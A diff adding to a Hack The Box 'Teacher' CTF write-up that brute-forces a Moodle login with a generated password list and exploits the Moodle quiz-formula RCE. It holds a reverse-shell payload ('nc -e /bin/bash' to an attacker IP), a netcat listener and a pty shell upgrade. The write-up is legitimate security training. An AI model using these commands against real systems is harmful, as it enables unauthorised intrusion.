@@ -19,7 +19,7 @@
 
 // Navigating to http://10.10.10.153/ , present us with a Highschool website
 
-![Image 1]()
+![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/1.png)
 
 // Next we will use dirsearch to find directories or files on the website
 
@@ -41,11 +41,11 @@
 
 // Navigating to http://10.10.10.153/images/ we can see all the website photos, exept one - '5.png'
 
-![Image 2]()
+![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/2.png)
 
 // When clicking this photo we can see that photo cannot be open due to error in the photo
 
-![Image 3]()
+![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/3.png)
 
 // When checking the response to with 'curl' we get some information
 
@@ -70,7 +70,19 @@
     Thanks,
     Giovanni
 
-// Great!, we have partly password
+// Great!, we have User name and partly password, Move on...
+
+// When searching a directory with dirsearch we discovered another directory called '/moodle/'
+
+// [Moodle](https://en.wikipedia.org/wiki/Moodle) is a free and open-source learning management system written in PHP and distributed under the GNU General Public License
+
+// Lets check him, and there is a login buttun
+
+![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/4.png)
+
+// Clicking on the login navigate us to login page
+
+![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/5.png)
 
 // Next part its to complete the missing part of the password([Dictionary Attack](https://searchsecurity.techtarget.com/definition/dictionary-attack)), since we dont know what it is
 
@@ -106,6 +118,129 @@
 
 // Now we got 'combined_pass.txt' passwords file
 
+    $ cat combined_pass.txt
+    ...
+    Th4C00lTheacha2&|
+    Th4C00lTheacha2&#
+    Th4C00lTheacha2*a
+    Th4C00lTheacha2*b
+    ...
 
+// Now that we have a User name and password list We can brute force the login page with BurpSuite Intruder
+
+![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/6.png)
+
+// We can see the extra ordinery request its with password 'Th4C00lTheacha#'
+
+// We can login as Giovanni now
+
+// Clicking on the top scrool down button we can see 'Massages' bar, click it
+
+![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/7.png)
+
+// We can see a massage sent from giovanni to admin about editing quiz
+
+// Searching in [ExploitDB](https://www.exploit-db.com) for moodle exploits, I found a remote code execution [exploit](https://www.exploit-db.com/exploits/46551)(2018-1133)
+
+// Trying to understant the exploit that writed in PHP, we can see the steps
+
+![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/8.png)
+
+            $this->login($url, $user, $pass);
+            $this->loadCourse($this->courseId);
+            $this->enableEdit();
+            $this->addQuiz();
+            $this->editQuiz();
+            $this->addCalculatedQuestion();
+            $this->addEvilQuestion();
+            $this->exploit();
+
+// Basically what the exploit does is:
+
+    Login >> Identify id(course number) >> Enable Edit mode >> Add Quiz >> Add malicious questions 
+
+// Lets try this
+
+// Clicking on the top scrool down button we can see 'Profile' bar, click it
+
+![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.1.png)
+
+// Next we can see the course 'ALG', click it
+
+![Image 9.2](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.2.png)
+
+// Now we click on the gear scrolldown and click on 'Turn editing ON'
+
+![Image 9.3](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.3.png)
+
+// Now we click on 'Add an activity or resource' and select 'Quiz' and click 'Add'
+
+![Image 9.4](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.4.png)
+
+// Add a name (i added 'shell') and click 'Save and Display'
+
+![Image 9.5](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.5.png)
+
+// Click 'Edit quiz'
+
+![Image 9.6](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.6.png)
+
+// Hit the 'Add' scrolldown and clicl '+ a new question'
+
+![Image 9.7](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.7.png)
+
+// Select 'Calculated' option and click 'Add'
+
+![Image 9.8](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.8.png)
+
+// Now we need the 'Answer Formula' found in the exploit
+
+![Image 9.9](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.9.png)
+
+// Add the formula and change grade to 100% (coz we good students[;)
+
+// This will allow us to pass system commands through a url parameter called 0 
+
+![Image 9.10](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.10.png)
+
+// Click 'Save changes' and now we can open a listiner
+
+    $ nc -lvnp 1444
+    listening on [any] 1444 ...
+
+// Now all that left to do its to add 0 parameter with our payload
+
+// add the payload to the url on the same webpage
+
+    &0=nc -e /bin/bash 10.10.16.232 1444
+
+// the browser will automatclly encode the code
+
+![Image 9.11](![Image 9.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Teacher/9.11.png)
+
+// And we got www-data shell !!
+
+    $ nc -lvnp 1444
+    listening on [any] 1444 ...
+
+    connect to [10.10.16.232] from (UNKNOWN) [10.10.10.153] 58544
+
+    id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+// Promote shell with python
+
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    www-data@teacher:/var/www/html/moodle/question$ 
+
+// Tring to get the flag i got blocked to enter giovanni user directory due to permissions
+
+    www-data@teacher:/var/www/html/moodle/question$ cd /home/
+    www-data@teacher:/home$ ls
+    giovanni
+    www-data@teacher:/home$ cd giovanni
+    bash: cd: giovanni: Permission denied
+
+// 
 
 
